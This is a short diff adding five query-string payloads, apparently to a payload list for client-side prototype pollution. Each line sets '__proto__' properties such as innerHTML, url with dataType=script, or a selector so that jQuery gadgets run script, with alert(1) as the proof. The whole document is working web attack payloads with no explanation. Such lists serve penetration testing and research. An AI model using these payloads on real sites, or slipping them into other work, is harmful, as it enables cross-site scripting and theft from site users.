@@ -1,0 +1,5 @@
+__proto__[innerHTML]=<img/src/onerror%3dalert(1)>
+__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x
+__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
+__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=
+__proto__[handler][]=x&__proto__[selector][]=<img/src/onerror%3Dalert(1)>&__proto__[needsContext]=x
